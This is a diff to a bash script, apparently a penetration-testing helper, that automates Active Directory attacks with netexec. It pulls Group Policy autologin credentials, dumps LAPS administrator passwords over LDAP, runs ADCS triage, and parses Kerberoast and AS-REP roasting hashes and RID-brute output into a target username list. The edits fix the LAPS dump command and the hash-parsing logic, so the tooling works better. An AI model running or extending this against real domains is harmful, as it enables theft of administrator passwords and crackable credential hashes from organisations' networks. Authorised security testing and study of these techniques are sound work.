@@ -17,8 +17,12 @@ USER=""
 PASS=""
 while [[ $# -gt 0 ]]; do
     case "$1" in
-        -u) USER="$2"; shift 2 ;;
-        -p) PASS="$2"; shift 2 ;;
+        -u)
+            if [[ $# -lt 2 ]]; then echo "[!] -u requires an argument" >&2; exit 1; fi
+            USER="$2"; shift 2 ;;
+        -p)
+            if [[ $# -lt 2 ]]; then echo "[!] -p requires an argument" >&2; exit 1; fi
+            PASS="$2"; shift 2 ;;
         *) shift ;;
     esac
 done
@@ -105,7 +109,10 @@ if [[ -n "$USER" && -n "$PASS" ]]; then
     nxc smb "$DC_IP" -u "$USER" -p "$PASS" -M gpp_autologin >"$OUT/gpp-autologin.log" 2>&1
 
     echo "[*] LAPS read"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --laps >"$OUT/laps.log" 2>&1
+    # --laps is an smb/winrm-only auth-helper flag in current netexec, not an ldap flag -- the
+    # actual bulk LDAP LAPS-password dump (incl. LAPS v2 msLAPS-EncryptedPassword decryption) is
+    # the 'laps' module.
+    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M laps >"$OUT/laps.log" 2>&1
 
     echo "[*] ADCS triage"
     nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M adcs >"$OUT/adcs-triage.log" 2>&1
@@ -130,13 +137,20 @@ echo "###### Parsing output ######"
 
 USERS_FILE="$OUT/users.txt"
 {
+    # enum4linux-ng -oJ writes {"users": {"<rid>": {"username": "...", ...}, ...}} -- keys[] would
+    # yield RIDs, not usernames.
     [[ -f "$OUT/enum4linux.json" ]] && command -v jq >/dev/null 2>&1 && \
-        jq -r '.users // {} | keys[]?' "$OUT/enum4linux.json" 2>/dev/null
+        jq -r '.users // {} | .[]?.username // empty' "$OUT/enum4linux.json" 2>/dev/null
     [[ -f "$OUT/rid-brute.log" ]] && grep -oP '(?<=\\)[A-Za-z0-9._-]+(?=\s)' "$OUT/rid-brute.log" 2>/dev/null
-    [[ -f "$OUT/ldap-users.log" ]] && grep -oP '(?<=\s)[A-Za-z0-9._-]+(?=\s+badpwdcount)' "$OUT/ldap-users.log" 2>/dev/null
-    for hf in "$OUT/kerberoast.hash" "$OUT/asrep.hash"; do
-        [[ -f "$hf" ]] && cut -d'$' -f4 "$hf" 2>/dev/null | cut -d'*' -f1
-    done
+    # nxc ldap --users prints "<module> <host> <port> <hostname> <sAMAccountName><pad>..." -- take
+    # the 5th whitespace-delimited field, skipping the "-Username-" header and "[*] Enumerated..."
+    # status lines it also writes to the same log.
+    [[ -f "$OUT/ldap-users.log" ]] && \
+        grep -oP '^\S+\s+\S+\s+\S+\s+\S+\s+\K[A-Za-z0-9][A-Za-z0-9._-]*(?=\s)' "$OUT/ldap-users.log" 2>/dev/null
+    # Kerberoast hash: $krb5tgs$23$*user$realm$spn*$chk$data -- field 4 is "*user", strip the '*'.
+    [[ -f "$OUT/kerberoast.hash" ]] && cut -d'$' -f4 "$OUT/kerberoast.hash" 2>/dev/null | sed 's/^\*//'
+    # AS-REP hash: $krb5asrep$23$user@REALM:chk$data -- field 4 is "user@REALM:chk", split on '@'.
+    [[ -f "$OUT/asrep.hash" ]] && cut -d'$' -f4 "$OUT/asrep.hash" 2>/dev/null | cut -d'@' -f1
 } | sed '/^\s*$/d' | sort -u > "$USERS_FILE"
 echo "[*] Deduplicated usernames -> $USERS_FILE ($(wc -l <"$USERS_FILE" 2>/dev/null || echo 0) found)"
 
